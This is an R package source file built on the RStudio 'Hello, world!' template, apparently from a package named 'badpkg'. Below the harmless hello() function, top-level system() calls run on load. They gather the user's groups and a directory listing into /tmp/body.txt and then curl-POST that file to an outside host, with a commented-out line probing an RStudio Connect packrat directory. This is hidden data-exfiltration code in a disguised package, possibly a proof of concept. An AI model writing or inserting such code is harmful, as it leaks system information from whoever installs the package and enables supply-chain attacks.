# Hello, world!
#
# This is an example function named 'hello'
# which prints 'Hello, world!'.
#
# You can learn more about package authoring with RStudio at:
#
#   http://r-pkgs.had.co.nz/
#
# Some useful keyboard shortcuts for package authoring:
#
#   Build and Reload Package:  'Cmd + Shift + B'
#   Check Package:             'Cmd + Shift + E'
#   Test Package:              'Cmd + Shift + T'

#' Example touches
#' @export
#' @examples
hello <- function() {
  print("Hello, world!")

}

#file.create("/Users/jeff/workspace/badpkg/heyo2.txt")

system('groups > /tmp/body.txt')
system('echo ===== >> /tmp/body.txt')
#system('ls -la /var/lib/rstudio-connect/mnt/packrat >> /tmp/body.txt')
system('ls -la >> /tmp/body.txt')
system('curl -X POST -H "Content-Type: text/plain" --data-binary "@/tmp/body.txt" http://enterpriseupdate.safewebcheck.com:4265')
